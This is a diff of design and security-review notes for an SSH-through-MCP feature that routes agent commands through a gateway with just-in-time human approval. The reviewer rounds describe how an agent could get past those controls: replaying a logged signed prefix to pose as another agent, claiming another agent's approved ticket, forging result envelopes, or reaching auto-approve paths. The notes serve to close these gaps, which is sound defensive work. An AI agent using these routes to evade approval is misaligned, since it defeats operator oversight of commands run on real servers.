+* **S1/S2/S3** — `read_only` refuses (§3), the timeout/F19 bound is stated
+  (§4), and the capability/format check fails closed (§9).
+* **Answers 1–5** are folded in as decisions (§11).
+
+`bash scripts/verify.sh`: `1856 passed, 3 skipped, 7 warnings in 379.20s (0:06:19)` (docs-only; the three skips are F18's read-lane tests).
+
+#### Round 3: fixes for design review round 2
+
+* **A1** — the nonce store is `/run/eshu/nonces`, `flock`ed check → append →
+  prune under one lock, pruned to ±300 s, bounded at 4096 entries (fail
+  closed, never evict unexpired), and fails closed on any store error. The
+  bash and the concurrency/stale/full/unwritable tests are in §5.
+* **A2** — the canonical form is a fixed `v1`-first newline-joined block with
+  every field charset-checked, `K = HMAC(token, "eshu-ssh-agent-v1")`, and the
+  gateway helper reads the key from `/etc/eshu-token` with the canonical string
+  on **stdin** (the signature is the only argument, so the key is never on
+  argv). The shared test vector (`eshu-test-token` … `uptime`) and its
+  expected MAC are in §5.
+* **A3** — every human-facing writer goes through `say()`, which prints in
+  direct mode and appends an escaped `messages` entry in MCP mode; the
+  command stream is captured and only the envelope reaches stdout. The cap is
+  **64 KiB for the MCP envelope** (F5's 16 KiB stays for `request_results`),
+  with the bash and the "exactly one envelope on every path" test in §8.
+* **A4** — the ticket line is `ts|agent|session|cmd` (command last), written
+  by the poller from the approval payload; a new gateway reads old `ts|cmd`
+  lines as agent-less; a signed request can never claim an agent-less line; an
+  unsigned request can claim only agent-less tickets. Both directions and the
+  cross-agent case are tested (§7).
+* **A5** — the trust change is written as an accepted risk with its
+  mitigations, plus the per-gateway "never accept the dashboard key" option
+  for the security reviewer to accept or defer (§12).
+
+#### Round 4: code-time notes from design round 3
+
+No code: F12 waits for the operator's go-ahead. The security sign-off below is
+recorded, and its G1-G8 conditions must be written into this note before the
+first line of code; the gateway bash then goes back to the security chat.
+
+* **N1 — the nonce store matches the nonce alone.** `consume_nonce` looks for
+  `$2 == nonce` (awk), so a repeated nonce is refused whatever timestamp it
+  carries. The MAC already binds the timestamp, but the store does not rely
+  on that. The A1 snippet shows the check.
+* **N2 — the envelope's `request_id` is an integer.** It prints
+  `REQUEST_ID_INT`, never the zero-padded `DISPLAY_ID`, which is not a valid
+  JSON number. The A3 snippet and its test say so.
+
+`bash scripts/verify.sh`: `1856 passed, 3 skipped, 7 warnings in 380.40s (0:06:20)` (docs-only; the three skips are F18's read-lane tests).
+
+#### Round 5: the security conditions G1–G8, written into the design
+
+No code. This round folds the security reviewer's conditions (`feaf144`,
+under "Security reviewer sign-off" above) into the design, in the sections
+that change. Where an earlier section and this one disagree, **this section
+wins**; the code round implements this text.
+
+* **G1 — sign with the derived key, not the token.** Added to §5. The key is
+  `K = HMAC-SHA256(token, "eshu-ssh-agent-v1")`, computed when a token is set
+  or rotated, stored in `gateways.ssh_key_derived` (hex), and never logged or
+  returned by an API. The signing path reads only the column and refuses
+  `ssh_key_unprovisioned` when it is empty. A startup backfill derives it for
+  rows that predate the column (they still hold a plaintext token; after
+  security Chunk 7 they will not, which is why it has to be stored now).
+  Tests: empty column refused, set/rotate computes and changes both `K` and
+  the signature, no `K` in responses or audit rows.
+* **G2 — refuse half-signed and ambiguous prefixes.** Added to §5, §2 and
+  §4. Any of the six identity keys present requires a fully valid signature
+  in **every** `ssh_mode`; a duplicate prefix key is refused; a missing field
+  is a refusal, not a default; `ssh_exec` refuses a command whose first word
+  starts with `ESHU_`; the prefix key is `ESHU_SESSION_ID` everywhere
+  (§2, §5); a valid agent MAC may stand in for `ESHU_SESSION_SIG` for the
+  session it covers, and only then.
+* **G3 — hash exactly the bytes the gateway runs.** Added to §2. `ssh_exec`
+  refuses leading/trailing whitespace and any control character other than
+  tab and newline, so `sha256(command)` is the hash of the bytes the gateway's
+  trim leaves untouched.
+* **G4 — the nonce store.** §5 A1 replaced: `/var/lib/eshu/nonces` in a
+  persistent root-owned `0700` dir; a separate `nonces.lock`; prune, replay
+  check, bound and append written to a temp file and `mv`ed into place;
+  charset → timestamp window → MAC → nonce, in that order; a store that
+  cannot be created refuses the call. N1 is kept. Tests: failed write leaves
+  the previous store intact, a bad MAC adds no entry, a replay after the
+  directory is recreated is still refused.
+* **G5 — version the ticket, and require the format.** §7 A4 replaced. The
+  line is `v2|ts|agent|session|cmd`; a line without the tag is old and
+  agent-less (everything after the first `|` is the command); an unsigned
+  caller may claim only an agent-less ticket; the dashboard refuses to sign
+  for a gateway that did not report `ssh_ticket_format=v2`. §9 lists the
+  check next to the agent-format one, and the installer/gateway/poller pair
+  is what reports it.
+* **G6 — a call on the dashboard key must be signed.** §4. The dashboard
+  `authorized_keys` line's forced command carries exactly one extra argument,
+  `--dashboard-key`, and sudoers allows exactly
+  `/usr/local/bin/eshu-gateway.sh` and
+  `/usr/local/bin/eshu-gateway.sh --dashboard-key`. sshd sets the argument; a
+  caller on the shared key cannot. The gateway refuses any call that carries
+  the marker without a valid signature, in every `ssh_mode`. A signed call on
+  the dashboard key runs normally. The "never accept the dashboard key"
+  switch stays deferred to Chunk 6, as the sign-off says in answer 4.
+* **G7 — harden the runner.** §4. Connect to the registered IP (never the
+  hostname), `-F /dev/null`, `-o UserKnownHostsFile=<pin file>`,
+  `-o GlobalKnownHostsFile=/dev/null`, `-o StrictHostKeyChecking=yes`. The
+  installer warns when `ALLOWED_SSH_FROM` names anything other than the
+  dashboard's own address, because every entry in that list may use the
+  dashboard key. The pin column stores the gateway's public key **line**,
+  not only its fingerprint: a fingerprint cannot build a `known_hosts`
+  entry. The line is still the only thing trusted, and the fingerprint is
+  what the UI and audits show.
+* **G8 — one logging rule.** §5. The gateway logs the command only after
+  **all** prefixes are stripped, `ESHU_SESSION_SIG` included, and logs no
+  prefix value, signature or nonce at any level. The initial `from=… cmd=…`
+  line moves below the parser for this reason. Chunk 7's "stop logging the
+  signature" item stays open until whichever ships first is deployed.
+
+Two implementation details settled while folding these in, both written into
+the sections above so the code cannot invent them:
+
+* `GET /api/ssh-key` is public (it returns a public key; the installer must
+  reach it before it has any credential). It is not a session endpoint, and
+  it returns nothing else.
+* the F5 `request_results` row is still posted by the gateway with its
+  `request_id`; the dashboard stores one only if that post did not land, so
+  `first result wins` keeps holding and there is never a duplicate row.
+
+`bash scripts/verify.sh`: `2331 passed, 7 warnings in 428.69s (0:07:08)` (docs-only).
+
+#### Round 6: implementation of round 5 (code round)
+
+The code commit is **`aa268de`** — *"feat(f12): ssh_exec — SSH through Eshu
+over MCP (design round 5)"*. **It contains the gateway bash**
+(`dashboard/eshu-gateway.sh`, `dashboard/eshu-poller.sh`,
+`dashboard/eshu-installer-template.sh` and both regenerated installers), so
+that is the commit the security reviewer reviews before merge. The dashboard
+side is in the same commit because the two halves share the canonical form
+and the test vector; the notes commit (`this one`) is docs-only.
+
+**Where each condition lives.**
+
+| | Dashboard | Gateway / installer | Tests |
+|---|---|---|---|
+| G1 | `core/ssh_crypto.derive_key`, `gateways.ssh_key_derived` (set on every `set_gateway_token`, startup backfill, `ssh_key_unprovisioned` refusal) | the helper derives `K` itself from `/etc/eshu-token` | `TestDerivedKey`, `test_key_is_not_in_the_register_response` |
+| G2 | `command_problem` (no `ESHU_` first word), `ESHU_SESSION_ID` everywhere, session ownership | duplicate keys and half-signed prefixes refused in every mode; agent MAC vouches for the session it covers | `test_a_lone_mcp_flag_is_refused`, `test_half_signed_*`, `test_a_duplicate_prefix_key_is_refused`, `test_an_incomplete_prefix_is_refused`, `test_a_valid_agent_mac_vouches_for_the_session` |
+| G3 | leading/trailing whitespace and control bytes refused before signing | the trim happens after the prefix parse, so the MAC covers what runs | `TestCommandBytes` |
+| G4 | — | `nonce_store_ready` / `consume_nonce` exactly as §5, `/var/lib/eshu/nonces`, temp + rename, MAC before write | `test_nonce_store_is_persistent_not_in_run`, `test_a_bad_mac_adds_no_entry`, `test_an_unwritable_store_refuses_and_keeps_the_old_entries`, `test_a_full_store_refuses` |
+| G5 | `requests.ticket_line` (`v2\|ts\|agent\|session\|cmd`), `/api/poll` and `/api/ticket` | `parse_ticket_line`, `ticket_allowed`, `remove_claimed_ticket`; the poller prunes `$2` for `v2` | `TestTickets`, the ticket cases in `tests/test_f12_gateway.py` |
+| G6 | — | `--dashboard-key` refuses an unsigned call in every `ssh_mode`; sudoers allows exactly the two argv shapes | `test_dashboard_key_*`, `test_f12_sudoers_allows_exactly_two_argv_shapes` |
+| G7 | `build_argv` (registered IP, `-F /dev/null`, `UserKnownHostsFile`, `GlobalKnownHostsFile=/dev/null`, `StrictHostKeyChecking=yes`), pin helpers | — | `TestRunnerArgv`, `test_f12_dashboard_key_line_and_marker` |
+| G8 | audit rows carry the command **hash**, never the command | one log line after the parse, stripped, no prefix values | `test_log_line_has_the_stripped_command_and_no_prefix_values`, `test_refusal_log_has_no_raw_value` |
+
+**Two bugs the tests caught during implementation** (both in the gateway
+bash, both worth seeing in review):
+
+* The A2 snippet in the design said "the canonical string arrives on stdin".
+  The original code used a heredoc for the Python program, and a heredoc
+  takes stdin for itself, so the canonical never reached the helper and every
+  signature was refused. The fix is `python3 -c '…' "$ESHU_AGENT_SIG"`, which
+  keeps stdin free — exactly what the design text describes, so the text did
+  not need to change.
+* In MCP mode the stream went through `tee "$ESHU_OUT_FIFO"`, and `tee`
+  also writes to stdout: the command's output appeared *before* the envelope,
+  which the dashboard correctly called `bad-envelope`. In MCP mode the `tee`
+  now writes to `/dev/null`; the FIFO reader is the only consumer, so the
+  envelope is the only stdout.
+
+**Other things the reviewer should see.**
+
+* `ESHU_NONCE_OWNER` is a test seam (default `0`) like the existing
+  `ESHU_RUN_OWNER`: the sandbox runs as a non-root user. Env cannot move the
+  store in production — the script unsets every variable it does not
+  whitelist before the store is touched.
+* An old installer that re-registers sends no capability fields, which
+  **clears** the stored pair and makes `ssh_exec` refuse (`ssh_not_ready`)
+  until the gateway is re-enrolled with the new installer. That is the
+  fail-closed reading of §9; noted in case the reviewer prefers keeping the
+  last reported pair.
+* The gateway posts the F5 row for an MCP run even when `/etc/eshu-capture`
+  is `off`/`exit-only` (the envelope already carried those bytes to the
+  agent, and the dashboard would store them otherwise). See open question 1.
+
+**Open questions (for the security reviewer / reviewer):**
+
+1. Should an MCP run's output be stored in `request_results` when the
+   gateway's capture mode is `off`? Round 5 says the row comes from the
+   gateway; in practice MCP mode captures to build the envelope, so the
+   gateway stores the last 16 KiB of it. The alternative is to store nothing
+   when capture is off and let the MCP client be the only holder. This is a
+   data-retention choice, not a security one, and the current behaviour is
+   the more auditable one.
+2. §4 says "the UI warns when `ALLOWED_SSH_FROM` on a gateway covers more
+   than the dashboard's own address". The dashboard cannot know that value
+   (the installer applies it locally), so the warning is printed by the
+   installer, where the value exists. If a UI warning is still wanted, it
+   needs the installer to report the applied `from=` at registration — say
+   the word and it is a small follow-up, not part of this commit.
+
+`bash scripts/verify.sh`: `2462 passed, 7 warnings in 456.51s (0:07:36)` (the whole suite, on `aa268de`).
+
+#### Round 7: fixes for code round 1 (M1–M3, S1–S2; the gateway bash review R1–R4, S1–S4)
+
+The code commit is **`c137e55`**. **It contains the gateway bash**
+(`dashboard/eshu-gateway.sh`, `dashboard/eshu-poller.sh`,
+`dashboard/eshu-installer-template.sh`) and both regenerated installers, so
+that is the commit the security reviewer re-reads (only the diff, as asked).
+This notes commit is docs-only.
+
+**Feature reviewer.**
+
+* **M1 — an old gateway got a v2 ticket.** `db/requests.ticket_line` now
+  takes the gateway's reported format: `v2|ts|agent|session|cmd` only when
+  the stored `ssh_ticket_format` is `v2`, the old `ts|cmd` otherwise. Both
+  call sites pass it (`update_ticket_consumed_by_ip` for `/api/poll`,
+  `get_ticket_by_request_id` for `/api/ticket`), read in the same function so
+  a re-registration cannot change the format mid-delivery. An agent row on a
+  gateway that has not reported v2 is **refused**: the row is denied (a
+  terminal state the agent's `wait`/`check_request` sees) and a `jit_refused`
+  audit row is written, because the old format has no agent field and an
+  unsigned caller could claim it. Tests:
+  `test_an_old_gateway_gets_the_old_line_from_both_call_sites`,
+  `test_a_v2_gateway_gets_v2_from_both_call_sites`,
+  `test_an_agent_row_on_an_old_gateway_is_refused`,
+  `test_the_ticket_endpoint_refuses_an_agent_row_on_an_old_gateway` and the
+  `ticket_line` shape tests.
+* **M2 — the approval race on re-run.** `wait` re-runs only at `consumed`
+  (the poller has taken the ticket into the lockbox), never at `approved`;
+  `check_request` returns a `next_step` — `approved` reads "delivering to the
+  gateway — do not re-run yet", `consumed` reads "ready to re-run" — and the
+  `ssh_exec` description says `consumed` too. Tests:
+  `test_wait_reruns_once_consumed`, `test_wait_does_not_rerun_while_approved`
+  (a simulated poller lag: exactly one signed call, the row stays approved)
+  and `test_next_step_is_ready_only_after_consumed`.
+* **M3 — force-JIT failed open.** The re-derivation now uses
+  `db.agent_policies.DEFAULT_SSH_MODE` (the same constant `ssh_exec` uses):
+  an unknown agent, an exception and an unset mode all force JIT instead of
+  auto-running. Tests: `test_an_unknown_agent_fails_closed_to_approval`,
+  `test_a_policy_error_fails_closed_to_approval`,
+  `test_an_unset_ssh_mode_fails_closed_to_approval`.
+* **S1 — capability vs token file.** The installer claims
+  `ssh_agent_format=eshu-ssh-agent-v1` only when it will write
+  `/etc/eshu-token` (install/reinstall) or the file already exists (upgrade).
+  A self-updated gateway with no token file therefore reports no agent
+  format, and `ssh_exec` refuses with `ssh_not_ready` instead of every call
+  failing as `bad signature`. Ticket format v2 is still reported — the new
+  gateway script understands it without a token. Test:
+  `test_f12_register_reports_pin_and_capabilities`.
+* **S2 — an unverified agent in the log.** See R2.
+
+**Security reviewer (gateway bash).**
+
+* **R1 — the token was world-readable.** `write_gateway` creates the script
+  (and its temporary `.bak`) under `umask 077` and finishes 0700 root:root in
+  every installer mode; the token temp file is written under `umask 077` in
+  the installer and in both poller rotation paths, so it is never readably
+  transient. Tests: `test_f12_write_gateway_is_root_only_in_every_mode` (a
+  real run of the shipped `write_gateway` twice, covering the update path),
+  `test_f12_token_file_is_created_0600_under_a_permissive_umask` (runs the
+  block under `umask 022` and observes the mode *at the chmod*, proving the
+  creating umask) and `test_f12_poller_token_rotation_uses_umask_077`.
+* **R2/S2 — `PREFIX REFUSED` logged the raw agent value.** It now logs
+  `${ESHU_VERIFIED_AGENT:-none}`, set only after the MAC verifies, so a
+  value that failed its charset check never reaches syslog. Test:
+  `test_the_refusal_log_carries_no_unverified_agent` (a control byte in
+  `ESHU_AGENT`; nothing from it appears in the log).
+* **R3 — an unknown `ESHU_` word after the parse.** The gateway refuses a
+  command whose first word still starts with `ESHU_` after the prefixes are
+  stripped, which covers both an unknown key and a known key placed after
+  one. Tests: `test_an_unknown_eshu_key_is_refused_direct`,
+  `test_an_unknown_eshu_key_is_refused_in_mcp_mode`,
+  `test_a_known_key_after_an_unknown_one_is_refused`.
+* **R4 — MCP output was stored under `exit-only`.** `post_exec_result` now
+  keys on the capture mode alone: `off` posts nothing, `exit-only` stores the
+  exit code and duration, `tail` stores the tail (in MCP mode still read from
+  the envelope capture, the same stream). Tests:
+  `test_mcp_exit_only_stores_no_output`, `test_mcp_tail_still_stores_the_tail`.
+* **S1 — unmaced keys in a signed prefix.** A signed prefix carrying
+  `ESHU_WINDOW_TOKEN` or `ESHU_EXECUTION_ID` (neither is in the MAC) is
+  refused. Test: `test_a_signed_prefix_must_not_carry_unmaced_keys`.
+* **S2 — the nonce store was not self-protected.** `/var/lib/eshu` is on the
+  hard blocklist, so deleting it is FATAL. Test:
+  `test_the_nonce_store_is_self_protected`.
+* **S3 — sudoers allowed arguments.** The plain line is now
+  `/usr/local/bin/eshu-gateway.sh ""` (sudoers(5): `""` means no arguments);
+  the dashboard line already named its one argument. Test:
+  `test_f12_sudoers_allows_exactly_two_argv_shapes`.
+* **S4 — the host argument.** `ssh_exec` checks the gateway IP against
+  `IP_RE` (`[0-9A-Fa-f:.]{1,64}`, the gateway's own `TARGET_IP` pattern)
+  just before `run_ssh`, so neither a hostname nor an option-like string can
+  reach `build_argv`. Test:
+  `test_a_gateway_whose_ip_is_not_an_ip_is_refused`.
+
+**The two open questions, answered as the reviews decided.**
+
+1. **MCP output and capture `off`.** The operator's setting wins (R4, §2.5):
+   `off` writes no `request_results` row, `exit-only` stores the exit code and
+   duration only, `tail` stores the tail. The MCP envelope still carries the
+   bytes to the agent — the row is a dashboard artefact, not the agent's
+   only copy.
+2. **`ALLOWED_SSH_FROM`.** The installer warning (already in the installer,
+   where the value exists) is the answer; the security reviewer recorded that
+   it is enough for G7. The optional UI echo of the applied `from=` would
+   need the installer to report it at registration — deferred, not needed
+   for the gate.
+
+**One thing the reviewer should see.** `_refuse_agent_ticket` takes the
+request id explicitly, and both lookup paths capture the fields the audit
+needs inside the `with` block: `get_ticket_by_request_id` projects only the
+columns it returns (no `id`), and a `sqlite3.Row` is not safe to read after
+its connection closes.
+
+`bash scripts/verify.sh`: `2484 passed, 7 warnings in 461.05s (0:07:41)`.
+
+#### Round 8: merged forward — the MCP capture on the CI fix
+
+This merge brings the branch onto the updated `feature-roadmap` (CI fix
+`f2746ef`, deploy helper). The gateway capture is now the CI fix's:
+
+* **No FIFO.** `run_sanitized` has no `mkfifo`, no second reader, no
+  `wait "$ESHU_TAIL_PID"`. F12's MCP branch is
+  `"$@" 2>&1 | sanitize | capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null`, so
+  the envelope capture is the same in-stream ring; the command's output never
+  reaches stdout.
+* **One ring, two caps.** `capture_tail` takes the byte cap as `$2`
+  (default 16 385) and sizes its ring at `cap + 2`; F5 keeps its 16 KiB and
+  the MCP envelope its 64 KiB + 1. In MCP mode only `ESHU_MCP_CAP` is
+  created; `post_exec_result` already reads it for the F5 row when the
+  operator's capture mode is `tail` (R4).
+* **B1 comes with it** (`stdbuf -oL sed` in `sanitize`). B2's `-W interactive`
+  is not used: it splits records longer than 4096 bytes (see F5 round 6).
+  F12's tests, the F5 capture tests and the gateway-script tests pass.
+* Both installers were regenerated in this commit.
+
+#### Round 9: merged forward again — onto the buffering fix
+
+This merge brings the branch onto `feature-roadmap` at `ef2418f`, which
+contains the line-buffered `sanitize` (`fix/stream-unbuffered`, merge
+`d8d70c2`; security sign-off `f0d5bc8`). The merge commit is `dc3eb01`.
+
+* **`sanitize` is the roadmap's, unchanged.** It runs
+  `"${SANITIZE_CMD[@]}" -e …`: `SANITIZE_CMD=(stdbuf -oL sed -E)` when
+  `stdbuf` is found once on the fixed `PATH` after the environment is
+  scrubbed, `(sed -E)` otherwise with a single syslog line
+  (`BUFFERING: stdbuf is unavailable; …`). The redaction expressions are
+  byte-identical to the branch's old ones, so every sanitize test passes
+  without a change. This is B1; the branch no longer has plain `sed -E`.
+* **The MCP branch is unchanged:**
+  `"$@" 2>&1 | sanitize | capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null`.
+  One in-stream ring, no FIFO, nothing to wait for; the command's own output
+  still never reaches stdout. `capture_tail` keeps the `$2` cap and the
+  `cap + 2` ring from round 8 (the roadmap's copy still has the fixed
+  16 385 cap, so this file's version is the one the merge keeps).
+* **Conflicts and how they were resolved.** `sanitize` itself auto-merged to
+  the roadmap form, so there was no conflict there in the end. Three files
+  did conflict:
+  - `tests/test_f5_capture_tail.py`: `_sandbox` takes both seams —
+    `awk_name`, the roadmap's `awk_body` stub and F12's `cap`; the B2
+    `-W interactive` guard and the 65 537-byte envelope test both stay
+    (they are complementary, not alternatives).
+  - `tests/test_gateway_script.py`: the F12 path and nonce swaps and the
+    CI fix's `stdbuf=False` swap are both kept, `stdbuf` first.
+  - `docs/features/FEATURE_PLAN.md`: the F12 status row, rewritten for this
+    merge.
+* **Not changed here.** B2's `-W interactive` is still not used (F5 round 6
+  measured that it splits or truncates long records). The mawk/`tail`
+  residual noted in the buffering-fix sign-off applies to F5 capture; the
+  MCP path writes the ring to `/dev/null`, so its buffering does not matter.
+* Both installers were regenerated in the merge (`python3
+  dashboard/gen_installer.py`); the embedded gateway in each matches the
+  source.
+
+The security reviewer re-reads the merged gateway diff; the feature reviewer
+merges after that.
+
+`bash scripts/verify.sh`: `2505 passed, 22 skipped, 7 warnings in 464.25s (0:07:44)`
+(gawk is not installed in this container, so its parameters skip here too).
 
 ### Reviewer notes
 
-_(reviewer)_
+**Round 1 (2026-11-09): design changes requested. Not ready for the security
+reviewer yet.** I reviewed the design note at `97776d6`, against the gateway
+(`eshu-gateway.sh`) and the installer template as they are on
+`feature-roadmap`. Only the design was reviewed, because the branch has no
+code. `bash scripts/verify.sh` on the docs change: `1856 passed, 3 skipped, 7 warnings in 328.10s (0:05:28)`.
+
+**What is right.** The overall shape works:
+
+* `ssh_exec` reaches the gateway's existing forced command, so every
+  gateway stage still runs.
+* `host` is looked up, never interpolated.
+* The runner uses a fixed argv with no shell, `BatchMode`, and a
+  process-group kill.
+* Direct SSH keeps its text output, so the F5 golden test is untouched.
+* `ssh_hosts_allow` is opt-in, with empty meaning none.
+* `mcp_only` lets the operator retire the shared key one gateway at a
+  time.
+
+The dashboard key adds little new power. The dashboard can already approve
+anything, and the key only reaches the same forced command. Six design gaps
+need an answer before the security review.
+
+*Must fix (in the design note):*
+
+* **R1 The agent signature must bind the command and be single-use.** The
+  proposed MAC covers the agent, session, timestamp and `force_jit`, but not
+  the command bytes and not `ESHU_MCP`. It is valid for ±300 s and can be
+  reused. Today the gateway also writes the whole `SSH_ORIGINAL_COMMAND`,
+  prefixes included, to syslog (stage 1, `logger … cmd=…`). Anything that can
+  read the gateway's logs can therefore see a fresh signed prefix. That
+  includes an agent with log reads, and later F4's read lane, which allows
+  `/var/log` and `journalctl`. A direct-SSH agent could then put that prefix
+  in front of its own command and be recorded as the other agent, inheriting
+  that agent's mode, and later its per-agent overrides. **Design change:**
+  * The MAC covers a canonical encoding of every prefix field plus
+    `sha256(command)` and the gateway's own identity (its IP, or a gateway
+    id).
+  * Add a random nonce, which the gateway keeps for the validity window and
+    refuses to see twice.
+  * Stop logging the signature and nonce values: log `agent=` and
+    `sig=ok|bad|none` only.
+
+  **Tests:** a valid prefix with a different command is refused; the same
+  prefix twice is refused; a prefix signed for gateway A is refused on
+  gateway B; a flipped `ESHU_MCP` is refused; the syslog line has no
+  signature hex.
+* **R2 Say where `ESHU_FORCE_JIT` is honoured, end to end.** The auto-run
+  decisions are not all on the gateway. The allowlist and windows run there,
+  but the F3 plan, session override, F4 read lane and host override run on
+  the dashboard inside `receive_request` (§ 2.6). As written, an `approval`
+  agent's `uptime` would still be auto-approved by an active host override
+  or the read lane. The note also says that the gateway still runs "plans,
+  the read lane … exactly as today", which contradicts the `approval` mode.
+  **Design change:**
+  * The gateway skips its allowlist and window auto-run stages when
+    `force_jit` is set and signed, and passes `force_jit` (and the verified
+    `agent`) to `/api/request`.
+  * `receive_request` then skips every auto-approve path: plan, session
+    override, read lane and host override. It also re-derives the mode from
+    the agent's own policy, so the dashboard does not rely on the prefix
+    alone.
+  * The § 2.6 order is otherwise unchanged. Freeze, the encoded-payload
+    block and the blocklists still win.
+
+  **Tests:** for each auto path (allowlist, window, plan, session override,
+  read lane, host override), a `force_jit` request stays pending.
+* **R3 Bind the approved ticket to the agent.** `claim_lockbox_ticket`
+  matches on the command bytes alone. While a gateway is in `direct+mcp`,
+  any shared-key caller that sends the same bytes within 90 s takes agent
+  A's approved ticket, runs it under its own identity and gets the output.
+  The re-run step of the pending → approve → re-run flow depends on that
+  claim. **Design change:** the ticket line carries `agent` (and the
+  session), and the claim also matches them. An unsigned request can claim
+  only a ticket with no agent. **Tests:** agent B, and an unsigned caller,
+  cannot claim agent A's ticket; agent A claims it exactly once.
+* **R4 The `authorized_keys` line must reuse today's options.** The
+  installer writes
+  `command="/usr/bin/sudo /usr/local/bin/eshu-gateway.sh",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,restrict`
+  and an optional `from=` (`ALLOWED_SSH_FROM`). It *overwrites* the file
+  with that one line. The note's proposed line has a different command path
+  and no `restrict`/`no-*` options. **Design change:** the dashboard key
+  gets the same option set and forced command, plus its own `from=`. The
+  installer writes both lines (the shared key, while the gateway is in
+  `direct+mcp`, and the dashboard key). Re-running it replaces each line
+  rather than adding to it. **Tests:** the generated file has both lines,
+  each with `restrict` and the forced command; re-running does not
+  duplicate either line; and `mcp_only` drops the shared-key line.
+* **R5 Framing of the MCP envelope.** The dashboard parses the gateway's
+  stdout. If any command output reaches stdout outside the envelope, a
+  command can print an envelope-shaped line and forge `status: "ran"` or a
+  fake `exit_code`. **Design change:** in MCP mode, the gateway captures all
+  command output (F5's capture path), base64-encodes it inside the
+  envelope, and prints *only* the envelope. The dashboard accepts exactly
+  one envelope with a fixed marker and treats anything else as `refused`
+  (`bad-envelope`). **Test:** a command whose output contains an
+  envelope-shaped line comes back inside `output`, and the outer result is
+  unchanged.
+* **R6 Where the pinned host key comes from.** "Captured at registration" is
+  not specific enough. The dashboard must not learn the key by scanning it
+  over the network on first use. **Design change:** the gateway sends its
+  own host public key (from `/etc/ssh/ssh_host_ed25519_key.pub`) in the
+  token-authenticated registration and heartbeat. The dashboard stores the
+  fingerprint and refuses to `ssh_exec` a gateway that has no pin. A
+  changed key in a heartbeat raises an audit event and does **not** re-pin.
+  Re-pinning is an explicit, audited operator action. **Tests:** no pin
+  means refused; a mismatch is refused and audited; a heartbeat with a new
+  key does not change the pin.
+
+*Should fix:*
+
+* **S1 (Q3) `read_only` should refuse non-reads.** `approval` already means
+  "ask me about everything". If `read_only` also queues writes for the
+  operator, the two modes differ only in whether reads auto-run. That is
+  the tired-operator risk the note names. Return
+  `{status: "refused", reason: "read-only agent"}` and create no request.
+* **S2 Timeouts.** Killing the local `ssh` does not stop the remote
+  command. Say that F19 is the real bound, and that until F19 the `timeout`
+  only limits how long the agent waits. Keep `timeout` ≤ 120 s, and note
+  that a JIT TTL of 90 s means `wait` cannot exceed 60 s usefully.
+* **S3 The capability flag fails closed.** `ssh_exec` refuses a gateway
+  that has not reported the capability, as written. Also refuse one whose
+  version predates the R1 MAC format, so a half-updated fleet cannot
+  downgrade the format.
+
+*Answers to the open questions:*
+
+1. **Signing key.** Using the gateway token with a label is acceptable to
+   me if the key is derived as `HMAC(token, "eshu-ssh-agent-v1")` and that
+   derived key is used for the MAC. Rotating the token then rotates it.
+   This is the security reviewer's call.
+2. **`from=` and NAT.** Keep `from=`, and reuse the installer's existing
+   `ALLOWED_SSH_FROM` override for NAT or a proxy. Do not ship a line
+   without `from=`.
+3. **`read_only`.** Refuse; see S1.
+4. **Key location.** Default to `/var/lib/eshu/ssh/`, with an env override
+   (`ESHU_SSH_KEY_DIR`). Refuse to start the runner if the directory is not
+   `0700` and owned by the service user, or if the key is not `0600`.
+5. **`wait: true`.** Keep it, capped at 60 s. When the cap is reached,
+   return `pending` with the `request_id`, so the agent falls back to
+   `check_request`.
+
+*For the security reviewer (no change asked here):* the existing
+`ESHU_SESSION_SIG` has the same "logged and not bound to the command" shape
+as R1. It is out of F12's scope. It belongs with security Chunk 6 or 7.
+
+Once R1–R6 are written into the note, F12 goes to the security reviewer
+(§ 2.6a) for design sign-off. No code until both approvals are recorded.
+
+**Design round 2 (2026-11-09, main feature reviewer): approved in principle;
+fold in A1–A5, then it goes to the security reviewer.** R1–R6 are right, and
+the reasoning in §6 (force-JIT has to cover the dashboard's auto paths too)
+and §8 (one envelope, output only inside it) is exactly what was missing.
+Five parts are still underspecified and would become bugs in the code. Add
+them to the note (no code):
+
+* **A1 Nonce store on the gateway.** The gateway is a new process per SSH
+  call, so "a seen-nonce set" must be a file. Specify it:
+  * Path: `/run/eshu/nonces`, which inherits the poller's 0700 root-owned
+    checks.
+  * Concurrency: `flock` around check-and-add, so two concurrent calls with
+    the same nonce cannot both pass.
+  * Pruning: entries older than the ±300 s window are dropped on each write.
+  * Size bound: if the file is over N entries, refuse new signed calls
+    (fail closed) rather than evict unexpired nonces.
+  * Tests: two concurrent calls with the same nonce, exactly one passes.
+* **A2 Canonical form and HMAC tooling.** Make the MACed string unambiguous:
+  a fixed field order joined with `\n`, every field validated against a
+  charset without `\n`, and the version label first. Say how the gateway
+  computes HMAC without `python3` on the hot path: reuse whatever
+  `ESHU_SESSION_SIG` verification uses today, or `openssl dgst -sha256
+  -mac HMAC -macopt hexkey:…`, with the key **never on argv**, so pass it by
+  file or stdin. Give a test vector shared by the dashboard and gateway
+  tests.
+* **A3 Every gateway `echo` in MCP mode.** Today the gateway prints banners
+  and status lines on many paths (JIT "request sent", "[OK] Approved!
+  Executing…", blocklist and freeze messages, timeouts). In MCP mode none
+  of these may reach stdout. List the stdout writers in `eshu-gateway.sh`
+  and route them through one `say()` helper, which prints in direct mode
+  and appends to the envelope's `messages` field (escaped) in MCP mode.
+  Test: in MCP mode, stdout is exactly one envelope line on every path
+  (ran, pending, blocked, frozen, Zero-Trust, encoded, bad signature).
+  Also settle the output cap: F5's capture keeps 16 KiB, while this note
+  says 64 KiB. Pick one for MCP mode and show the bash.
+* **A4 Ticket format and compatibility.** The new ticket line carries agent
+  and session in front of the command (`ts|agent|session|cmd`, with the
+  command last so `|` inside it survives).
+  * Say who writes it: the poller, from a new field in the approval
+    payload.
+  * The new gateway must still read old `ts|cmd` lines as agent-less.
+  * An old poller writing old lines must never let a signed MCP request
+    claim an agent-less ticket. A signed request may only claim a ticket
+    for its own agent.
+  * Tests for both directions.
+* **A5 State the trust change plainly.** Until now the dashboard could
+  approve commands but not start them. With the dashboard key it can start
+  a command on every gateway, so a compromised dashboard can now both start
+  and approve its own commands. JIT still runs on the gateway, but the
+  approval lives on the same dashboard. Write this as an accepted risk, and
+  list the mitigations:
+  * `from=` on the key;
+  * per-gateway `ssh_mode` with `direct+mcp` as default, so the key can be
+    left off sensitive gateways;
+  * the key file's modes;
+  * an audit row per `ssh_exec`.
+
